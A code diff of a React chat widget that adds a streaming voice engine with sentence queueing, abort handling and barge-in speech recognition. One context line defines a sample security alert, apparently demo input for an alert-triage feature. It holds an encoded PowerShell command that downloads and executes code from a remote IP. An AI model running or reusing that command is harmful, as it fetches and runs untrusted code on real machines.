@@ -21,7 +21,10 @@ type Msg = {
 const SAMPLE_ALERT = '2026-11-20T03:14:07Z host=WS-0142 user=jdoe EventID=4688 process=powershell.exe parent=winword.exe cmdline="powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQAMgAvAGEAJwApAA==" dest_ip=185.220.101.42'
 
 /** Backup voice: the browser's own speech, used only if PWEZA's voice can't be fetched. */
-function browserSpeak(text: string, onEnd: () => void) {
+function browserSpeak(text: string, onDone: () => void) {
+  let fired = false
+  const onEnd = () => { if (!fired) { fired = true; onDone() } }
+  setTimeout(onEnd, 2500 + text.length * 75) // some browsers never fire onend
   try {
     const synth = window.speechSynthesis
     if (!synth) return onEnd()
@@ -100,6 +103,13 @@ export default function AIChat() {
   const liveAfter = useRef(0)
   const wasLive = useRef(false)
   const sayRef = useRef<((t: string) => void) | null>(null)
+  // Live-call voice engine: always-fresh refs so callbacks never use a stale conversation.
+  const msgsRef = useRef<Msg[]>([])
+  const busyRef = useRef(false)
+  const abortRef = useRef<AbortController | null>(null)
+  const voice = useRef({ gen: 0, queue: [] as { text: string; p: Promise<string | null> }[], playing: false, streamDone: true, said: '' })
+  const bargeRef = useRef<any>(null)
+  useEffect(() => { msgsRef.current = messages }, [messages])
   const pathname = usePathname() || '/'
   const router = useRouter()
   const [online, setOnline] = useState(false)
@@ -201,24 +211,29 @@ export default function AIChat() {
     window.addEventListener('pweza:toggle', toggle)
     return () => window.removeEventListener('pweza:toggle', toggle)
   }, [])
-  useEffect(() => { if (!open) { try { window.speechSynthesis?.cancel() } catch {} audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])
+  useEffect(() => { if (!open) { voice.current.gen++; voice.current.queue = []; voice.current.playing = false; try { bargeRef.current?.abort?.() } catch {} bargeRef.current = null; try { window.speechSynthesis?.cancel() } catch {} audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])
 
   const send = async (text: string, opts: { mode?: 'demo'; label?: string } = {}) => {
     const q = text.trim()
-    if (!q || loading) return
+    if (!q || busyRef.current) return
     setSmart([])
-    const next: Msg[] = [...messages, { role: 'user', content: opts.label || q }]
+    const next: Msg[] = [...msgsRef.current, { role: 'user', content: opts.label || q }]
+    msgsRef.current = next
     setMessages(next)
     setInput('')
-    setLoading(true)
+    setLoading(true); busyRef.current = true
+    const talking = talkRef.current
+    if (talking) { stopSpeaking(); voice.current.streamDone = false }
+    const ctrl = new AbortController(); abortRef.current = ctrl
     window.dispatchEvent(new Event('pweza-asked'))
     try {
       const res = await fetch('/api/chat', {
-        method: 'POST',
+        method: 'POST', signal: ctrl.signal,
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           messages: next.slice(1).map((m, i, arr) => (i === arr.length - 1 && opts.label ? { ...m, content: q } : m)).filter((m) => m.role === 'user' || m.role === 'assistant' || m.role === 'joseph').map(({ role, content }) => ({ role: role === 'joseph' ? 'assistant' : role, content: content.replace(/\s*\[\d+\]/g, '') })),
-          wantsAudio: voiceOut || talkRef.current,
+          wantsAudio: voiceOut && !talking,
+          talk: talking || undefined,
           sid: chatSid(),
           stream: true,
           mode: opts.mode || (interview ? 'interview' : undefined),
@@ -246,7 +261,18 @@ export default function AIChat() {
       if ((res.headers.get('content-type') || '').includes('ndjson') && res.body) {
         const reader = res.body.getReader()
         const dec = new TextDecoder()
-        let buf = '', started = false, spoken = ''
+        let buf = '', started = false, spoken = '', pending = '', voiced = false
+        // Talk mode: speak each sentence as soon as it's written.
+        const flush = (all = false) => {
+          if (!talking || voice.current.gen < 0) return
+          for (;;) {
+            const m = pending.match(/^([\s\S]*?[.!?])(\s+)/)
+            if (!m) break
+            enqueueSpeech(m[1]); voiced = true
+            pending = pending.slice(m[0].length)
+          }
+          if (all && pending.trim()) { enqueueSpeech(pending); voiced = true; pending = '' }
+        }
         const patch = (fn: (m: Msg) => Msg) => setMessages((cur) => { const copy = cur.slice(); copy[copy.length - 1] = fn(copy[copy.length - 1]); return copy })
         const begin = () => { if (!started) { started = true; setLoading(false); setMessages((cur) => [...cur, { role: 'assistant', content: '', streaming: true }]) } }
         for (;;) {
@@ -260,13 +286,13 @@ export default function AIChat() {
             let ev: any
             try { ev = JSON.parse(line) } catch { continue }
             if (ev.type === 'meta') { begin(); patch((m) => ({ ...m, sources: ev.sources, card: ev.card, q })) }
-            else if (ev.type === 'delta') { begin(); spoken += ev.t; patch((m) => ({ ...m, content: m.content + ev.t })) }
-            else if (ev.type === 'replace') { begin(); spoken = ev.t; patch((m) => ({ ...m, content: ev.t, checked: !!ev.checked })) }
+            else if (ev.type === 'delta') { begin(); spoken += ev.t; pending += ev.t; flush(); patch((m) => ({ ...m, content: m.content + ev.t })) }
+            else if (ev.type === 'replace') { begin(); spoken = ev.t; if (talking && !voiced) { pending = ev.t; flush(true) } patch((m) => ({ ...m, content: ev.t, checked: !!ev.checked })) }
             else if (ev.type === 'done') {
               begin(); patch((m) => ({ ...m, links: ev.links, nav: ev.nav, streaming: false, q }))
               if (Array.isArray(ev.suggestions)) setSmart(ev.suggestions.slice(0, 3))
               if (ev.hiring) setLeadOpen(true)
-              playAudio(ev.audio, spoken)
+              if (talking) { flush(true); speechDone() } else playAudio(ev.audio, spoken)
             }
           }
         }
@@ -274,14 +300,17 @@ export default function AIChat() {
         return
       }
       const data = await res.json()
-      if (data.live) { setLive(true); wasLive.current = true; if (talkRef.current) setTimeout(() => listen(true), 400); return } // Joseph will answer himself
+      if (data.live) { setLive(true); wasLive.current = true; if (talking) speechDone(); return } // Joseph will answer himself
       const reply = data.content || data.error || "I couldn't answer that right now. You can email Joseph at kamarajosephallan@gmail.com."
       setMessages((m) => [...m, { role: 'assistant', content: reply, links: data.links, fit: data.fit, triage: data.triage, q, jobPost: data.fit ? q : undefined }])
-      playAudio(data.audio, reply)
+      if (talking) { enqueueSpeech(reply); speechDone() } else playAudio(data.audio, reply)
     } catch {
+      if (ctrl.signal.aborted) { setMessages((cur) => cur.map((m) => (m.streaming ? { ...m, streaming: false } : m))); return } // interrupted by the visitor
       setMessages((m) => [...m, { role: 'assistant', content: "Connection problem. Try again, or email kamarajosephallan@gmail.com." }])
+      if (talking) speechDone()
     } finally {
-      setLoading(false)
+      setLoading(false); busyRef.current = false
+      if (abortRef.current === ctrl) abortRef.current = null
     }
   }
 
@@ -330,21 +359,92 @@ export default function AIChat() {
     recRef.current = r
     try { r.start() } catch { /* already listening */ }
   }
-  sayRef.current = async (text: string) => {
-    try {
-      recRef.current?.stop?.()
-      const { audio } = await fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then((r) => r.json())
-      if (!audio) return browserSpeak(text, () => { if (talkRef.current) listen(true) })
-      audioRef.current?.pause()
-      audioRef.current = new Audio(audio)
-      audioRef.current.onended = () => { if (talkRef.current) listen(true) }
-      await audioRef.current.play()
-    } catch { if (talkRef.current) listen(true) }
+  // ---------- 🎙 Live-call voice engine ----------
+  function fetchVoice(text: string): Promise<string | null> {
+    return fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) })
+      .then((r) => r.json()).then((d) => d.audio || null).catch(() => null)
   }
+  function stopSpeaking() {
+    const v = voice.current
+    v.gen++; v.queue = []; v.playing = false; v.said = ''
+    audioRef.current?.pause()
+    try { window.speechSynthesis?.cancel() } catch {}
+  }
+  function enqueueSpeech(raw: string) {
+    const text = raw.replace(/\s*\[\d+\]/g, '').replace(/[*_#`]/g, '').trim()
+    if (!text) return
+    const v = voice.current
+    v.queue.push({ text, p: fetchVoice(text) }) // fetch now, so the next sentence is ready when this one ends
+    if (!v.playing) pump()
+  }
+  function speechDone() {
+    const v = voice.current
+    v.streamDone = true
+    if (!v.playing && !v.queue.length && talkRef.current) setTimeout(() => { if (!voice.current.playing && talkRef.current) listen(true) }, 250)
+  }
+  async function pump() {
+    const v = voice.current, gen = v.gen
+    v.playing = true
+    recRef.current?.stop?.()
+    startBarge()
+    while (v.queue.length && v.gen === gen) {
+      const item = v.queue.shift()!
+      v.said += ' ' + item.text
+      const audio = await item.p
+      if (v.gen !== gen) return
+      await new Promise<void>((done) => {
+        if (!audio) return browserSpeak(item.text, () => done())
+        audioRef.current?.pause()
+        const a = new Audio(audio)
+        audioRef.current = a
+        a.onended = () => done(); a.onerror = () => done(); a.onpause = () => done()
+        a.play().catch(() => done())
+      })
+    }
+    if (v.gen !== gen) return
+    v.playing = false
+    stopBarge()
+    if (v.streamDone && talkRef.current) setTimeout(() => { if (!voice.current.playing && talkRef.current) listen(true) }, 200)
+  }
+  // Barge-in: keep listening while PWEZA talks; the moment the visitor speaks, stop and answer them.
+  function stopBarge() { const b = bargeRef.current; bargeRef.current = null; try { b?.abort?.() } catch {} }
+  function startBarge() {
+    const SR = (window as any).webkitSpeechRecognition || (window as any).SpeechRecognition
+    if (!SR || !talkRef.current || bargeRef.current) return
+    const r = new SR()
+    r.lang = 'en-US'; r.interimResults = true; r.continuous = false
+    let barged = false, sent = false
+    const isEcho = (t: string) => {
+      const words = t.toLowerCase().match(/[a-z']{3,}/g) || []
+      if (words.length < 2) return true
+      const said = voice.current.said.toLowerCase()
+      return words.filter((w) => said.includes(w)).length / words.length >= 0.6
+    }
+    r.onresult = (e: any) => {
+      let text = '', final = false
+      for (let i = 0; i < e.results.length; i++) { text += e.results[i][0].transcript; if (e.results[i].isFinal) final = true }
+      if (!barged && !isEcho(text)) {
+        barged = true
+        stopSpeaking()
+        abortRef.current?.abort()
+        setListening(true)
+      }
+      if (barged && final && !sent && text.trim()) { sent = true; setListening(false); bargeRef.current = null; setTimeout(() => send(text), 0) }
+    }
+    r.onerror = () => {}
+    r.onend = () => {
+      if (bargeRef.current === r) bargeRef.current = null
+      if (barged && !sent) { setListening(false); if (talkRef.current) listen(true); return }
+      if (!barged && voice.current.playing && talkRef.current) startBarge() // recognizer timed out; keep the ear open
+    }
+    bargeRef.current = r
+    try { r.start() } catch { bargeRef.current = null }
+  }
+  sayRef.current = (text: string) => { stopSpeaking(); voice.current.streamDone = true; enqueueSpeech(text) }
   const toggleTalk = () => {
     const on = !talkRef.current
     talkRef.current = on; setTalk(on)
-    if (on) { setFull(true); listen(true) } else { recRef.current?.stop?.(); audioRef.current?.pause() }
+    if (on) { setFull(true); listen(true) } else { stopSpeaking(); stopBarge(); recRef.current?.stop?.() }
   }
 
   const rate = (i: number, vote: 'up' | 'down') => {
